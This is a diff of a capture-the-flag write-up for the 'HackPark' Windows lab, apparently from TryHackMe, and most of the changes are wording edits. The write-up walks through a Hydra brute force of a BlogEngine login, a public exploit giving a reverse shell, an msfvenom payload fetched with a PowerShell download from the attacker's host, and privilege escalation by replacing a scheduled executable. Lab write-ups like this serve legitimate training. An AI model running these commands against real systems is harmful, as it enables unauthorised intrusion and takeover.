@@ -1,9 +1,9 @@
 ﻿## HackPark
-Brute forcing a websites login with Hydra, identify and use a public exploit then escalate the privileges on a Windows machine!
+Brute forcing a website login with Hydra, identify and use a public exploit then escalate the privileges on a Windows machine!
 
-### Recon
+### ### Reconnaissance
 - There is a HTTP webpage on port 80 and is running a blog.
-- Have couple pages and a login page http://10.10.81.179/Account/login.aspx?ReturnURL=/admin/
+- Have couple pages and a login page at http://10.10.81.179/Account/login.aspx?ReturnURL=/admin/
 - When visited the home page source, can see the comment saying the website is using BlogEngine 3.3.6.0
 - Performed a nmap scan on the server to find if there are any open ports and other services.
 - 
@@ -28,9 +28,9 @@ Brute forcing a websites login with Hydra, identify and use a public exploit the
 - 3389 is open - potentially for RDP. 
 
 ### Cracking the login credentials
-The default credentials for Blog Engine are admin:admin (Google it), but it didn't worked, so lets bruteforce the admin id with hydra.
+The default credentials for Blog Engine are admin:admin (Googled it), but it didn't worked, so let's brute force the admin id using hydra.
 
-First we need to know the post request, using Burp we can intercept the request and gather the required information.
+Before that we need to know the post request that this web page is generating for login, using Burp we can intercept the request and gather the required information.
 
     POST /Account/login.aspx?ReturnURL=%2fadmin%2f HTTP/1.1
     Host: 10.10.226.92
@@ -47,7 +47,7 @@ First we need to know the post request, using Burp we can intercept the request 
     
     __VIEWSTATE=yrGSghNTTe59EhrZcotASBiG%2Fu27NFaNuaqaeJeceE2phHcTUqsXZ3Hl0a3SRfJ0VxuhZAjPF9VCrM6Q8x%2Fj6%2FQSuqhpgUXtrre1D%2BLhluiHKRZKCMF%2Btml5SyIgJed9mYrfaKSB5ecanrjmrT%2BnZHZUlGBG7UQ%2B1aIm74Iwy7D17DW9&__EVENTVALIDATION=jQVBkrYlbLeIG3SEUABAYZue3flPuZINcj8gu8A7CNvKIDb5QlIARVaqkq%2BUWa8%2FS5XYm0r28kj%2B3Im0tRMi1Zl4cd1hWRYiAPt3Hx5keSDUgU%2B4qqJ3DdJpI9gvJniOuEDK9y5%2FfqAiU%2FKfZFGbTENvw835mmLdTut1KKEJTpoFeMIx&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=admin&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in 
 
-Using the above information from Burp, we can now frame the request in hydra. 
+Using the above information from Burp, we can now frame the request in hydra for brute forcing. 
 
     $ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.226.92 http-post-form "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=yrGSghNTTe59EhrZcotASBiG%2Fu27NFaNuaqaeJeceE2phHcTUqsXZ3Hl0a3SRfJ0VxuhZAjPF9VCrM6Q8x%2Fj6%2FQSuqhpgUXtrre1D%2BLhluiHKRZKCMF%2Btml5SyIgJed9mYrfaKSB5ecanrjmrT%2BnZHZUlGBG7UQ%2B1aIm74Iwy7D17DW9&__EVENTVALIDATION=jQVBkrYlbLeIG3SEUABAYZue3flPuZINcj8gu8A7CNvKIDb5QlIARVaqkq%2BUWa8%2FS5XYm0r28kj%2B3Im0tRMi1Zl4cd1hWRYiAPt3Hx5keSDUgU%2B4qqJ3DdJpI9gvJniOuEDK9y5%2FfqAiU%2FKfZFGbTENvw835mmLdTut1KKEJTpoFeMIx&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
     Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
@@ -63,10 +63,11 @@ Using the above information from Burp, we can now frame the request in hydra.
 The brute force attack found the password for admin account as: 1qaz2wsx
 
 ### Getting a reverse shell
-Using the [exploit](https://www.exploit-db.com/exploits/46353) , update the local host ip in it and upload the file with the name as PostView.ascx using the post editor. 
-Open a netcat session to receive the reverse shell connection `nc -lnvp 4445`
+- Using the [exploit](https://www.exploit-db.com/exploits/46353), update the local host ip in it and upload the file with the name as PostView.ascx using the post editor. 
+- Open a netcat session to receive a reverse shell connection `nc -lnvp 4445`
 Run the exploit with directory traversal `10.10.73.64/?theme=../../App_Data/files`
-The reverse shell should be established on the netcat session.  
+- The reverse shell should be established on the netcat session.  
+-
 
     $ nc -lnvp 4445
     listening on [any] 4445 ...
@@ -77,17 +78,18 @@ The reverse shell should be established on the netcat session.
     c:\windows\system32\inetsrv>whoami
     iis apppool\blog
 
-The web server is running with user `iis apppool\blog`. 
+The web server is running with the user `iis apppool\blog`. 
 
 ### Privilege Escalation 
 
-Lets create a meterpreter session for more stable executions, to do this, we need to create a payload using msfvenom:
+- Lets create a meterpreter session for more stable executions, to do this, we need to create a payload using msfvenom:
 `$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.2.18.4 LPORT=4444 -f exe -o shell.exe`
 
-Open a reverse shell handler in Metasploit using the `exploit/multi/handler` with payload `windows/meterpreter/reverse_tcp`
+- Open a reverse shell handler in Metasploit using the `exploit/multi/handler` with payload `windows/meterpreter/reverse_tcp` on port 4444.
 
-Start a simple web server using `python3 -m http.server` in same directory. 
+- Start a simple web server using `python3 -m http.server` in same directory. 
 In the reverse shell that was already opened earlier, with the help of powershell lets download the payload and start the process.
+- 
 
     powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.2.18.4:8000/shell.exe','shell.exe')"
     c:\Windows\Temp>powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.2.18.4:8000/shell.exe','shell.exe')"
@@ -118,7 +120,8 @@ In the reverse shell that was already opened earlier, with the help of powershel
     .\shell.exe
     c:\Windows\Temp>.\shell.exe  
 
-This should open a Meterpreter session: 
+- This should open a Meterpreter session: 
+- 
 
     meterpreter > sysinfo
     Computer        : HACKPARK
@@ -131,19 +134,19 @@ This should open a Meterpreter session:
     meterpreter > 
 
 
-Let see what services are running on the host and if there are any that we can use for exploit. `meterpreter > ps` 
+Let see what services are running on the host and if there are any that we can use for exploit `meterpreter > ps`.
 
-Of all the listed serivices, we can windows scheduler is running.
+Of all the listed services, we can see windows scheduler is running.
  
 
      1376  672   WService.exe 
      1556  1376  WScheduler.exe 
 
-Navigate to `c:\Program Files (x86)\SystemScheduler\Events` to examine the scheduler logs and the file `20198415519.INI_LOG.txt` shows there is a service `Message.exe` which is running every 30 seconds and file is writable to everyone. 
+Navigate to `c:\Program Files (x86)\SystemScheduler\Events` to examine the scheduler logs and the file `20198415519.INI_LOG.txt` shows there is a service `Message.exe` which is running every 30 seconds and the file is writable to everyone. 
 
     100777/rwxrwxrwx  536992   fil   2019-08-04 07:36:42 -0400  Message.exe
 
- Using the above, we can now replace this file with a malicious code which can spawn a shell with system id. We already have a shell code that was generated using msfvenom earlier, so lets upload that to the victim and rename to Message.exe
+ Using the above, we can now replace this file with a malicious code which can spawn a shell. We already have a shell code that was generated using `msfvenom` earlier, so lets upload that to the victim and rename to Message.exe
 
     meterpreter > upload shell.exe 
     [*] uploading  : shell.exe -> shell.exe
@@ -151,7 +154,7 @@ Navigate to `c:\Program Files (x86)\SystemScheduler\Events` to examine the sched
     [*] uploaded   : shell.exe -> shell.exe
     meterpreter > dir
 
-Background the current Meterpreter session and run the multi/handler again to wait for new session to be established.
+Background the current Meterpreter session and start a new `multi/handler`  reverse shell listener. Wait for the scheduler to execute the malicious code and once executed, a new connection is established with administrator id. 
 
     meterpreter > background 
     [*] Backgrounding session 2...
@@ -180,7 +183,7 @@ We now have the Meterpreter session with Administrator access and grab the flags
 
  [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) is a utility where we can find more information about the Windows host and for any vulnerabilities. Download the file into the victim machine just like shell.exe above. 
 
-From the Meterpreter, open the shell and execute it.
+From the Meterpreter, start the shell and execute the winPEAS.bat.
 
     meterpreter > shell
     Process 1008 created.
@@ -191,6 +194,7 @@ From the Meterpreter, open the shell and execute it.
     c:\Windows\Temp>.\winPEAS.bat
 
 The system Original Install Date:     8/3/2019, 10:43:23 AM.
+
 
 
 
